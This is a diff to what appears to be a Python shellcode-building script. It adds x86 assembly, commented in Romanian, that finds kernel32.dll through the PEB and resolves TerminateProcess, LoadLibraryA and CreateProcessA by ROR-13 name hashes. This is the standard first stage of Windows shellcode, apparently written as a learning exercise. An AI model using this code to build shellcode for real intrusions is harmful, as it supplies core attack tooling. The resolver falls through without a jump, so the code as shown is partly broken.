@@ -14,6 +14,10 @@ def strip_comments(asm_code):
 
 CODE = """
 start:
+    ; creem stiva
+    mov ebp, esp
+    sub esp, 0x200
+
     xor eax, eax        ;
     mov eax, fs:[0x30]  ;
     mov eax, [eax + 0x0C]  ; 
@@ -54,7 +58,91 @@ skip:
 
 found:
     mov eax, ebx             ; salvam adresa de inceput a DLL-ului in EAX
-    ret                    ;
+
+
+; rezolvam functii din kernel32.dll
+resolve_symbols_kernel32:
+     push 0x78b5b983             ; has ROT 13 - TerminateProcess
+     call search_function         ; apelam find_name_loop
+     mov [ebp+0x10], eax         ; salvam adresa TerminateProcess
+
+     push 0xec0e4e8e             ; has ROT 13 - LoadLibraryA
+     call search_function         ; Call find_name_loop
+     mov [ebp+0x14], eax         ; salvam adresa LoadLibraryA
+
+     push 0x16b3fe72             ; has ROT 13 - CreateProcessA
+     call search_function         ; Call find_name_loop
+     mov [ebp+0x18], eax         ; salvam adresa CreateProcessA
+
+
+; acum vom cauta functii in kernel32.dll
+search_function:
+    mov edx, [esp+4] ; preluam parametrul din stiva - parametrul este hash-ul functiei cautate
+    ; facem +4 pentru a sari peste return address-ul functiei
+
+    pushad                        ; salvam toate registrele
+
+    mov eax, [ebx + 0x3C]        ; offset catre PE Header
+    mov edi, [ebx + eax + 0x78]  ; RVA Export Directory Table
+    add edi, ebx                 ; VMA Export Directory Table
+
+    mov ecx, [edi + 0x18]        ; salvam NumberOfNames (cate functii exportate sunt)
+                                 ; pe ECX
+
+    mov eax, [edi + 0x20]        ; RVA AddressOfNames array
+    add eax, ebx                 ; VMA AddressOfNames array
+
+save_names_vma:
+    mov [esp - 4], eax           ; salvam VMA AddressOfNames pe stack (safe)
+    mov [esp - 8], edx           ; salvam functia cautata inainte de ESP (salvare sigura pentru a nu perturba backup-ul registrilor facut cu `pushad`)
+
+find_name_loop:
+    jecxz end_find_name          ; daca ECX == 0, am iterat pana la sfarsit
+    dec ecx                      ; ECX = ECX - 1
+    mov eax, [esp - 4]           ; restauram VMA AddressOfNames
+    mov esi, [eax + ecx*4]       ; luam RVA simbol curent (4 bytes are un index)
+    add esi, ebx                 ; VMA simbol curent in ESI
+
+; vom verifica numele functiei
+compute_hash:
+    xor eax, eax                 ; stergem EAX 
+    xor edx, edx                 ; clear EDX (hash calculat a ramas in EDX)
+    cld                          ; setam DF pe 0 (mergem in fata in iteratie) - OPTIONAL
+
+hash_loop:
+    lodsb                        ; incarcam urmatorul caracter in registrul AL
+    test al, al                  ; daca AL este 0, am ajuns la sfarsitul string-ului
+    jz hash_done
+
+    ror edx, 0x0d                ; executam ROT 13 (rotim la dreapta 13 biti)
+    add edx, eax                 ; adaugam rezultatul la suma
+    jmp hash_loop                ; sarim inapoi in loop pentru urmatorul caracter
+
+hash_done:
+    cmp edx, [esp - 8]           ; este hash-ul functiei cautate?
+    jne find_name_loop
+
+found_name:
+    ; luam AddressOfOrdinals
+    ; EDI -> adresa absoluta a Export Directory Table
+    ; EBX -> adresa de baza a modulului KERNEL32.DLL
+
+    mov eax, [edi + 0x24]        ; salvam RVA AddressOfOrdinals
+    add eax, ebx                 ; calculam VMA AddressOfOrdinals
+
+    xor edx, edx                 ; EDX inca va avea hash-ul functiei, asa ca ii dam clear inainte sa facem orice cu el
+    mov dx, [eax + ecx*2]        ; luam ordinal (WORD) in DX
+
+    ; luam AddressOfFunctions
+    mov eax, [edi + 0x1C]        ; RVA AddressOfFunctions
+    add eax, ebx                 ; VMA AddressOfFunctions
+
+    mov eax, [eax + edx*4]       ; RVA functie gasita
+    add eax, ebx                 ; VMA functie in EAX
+
+end_find_name:
+    popad                        ; restauram registrele, am gasit functia
+    ret
 """
 
 
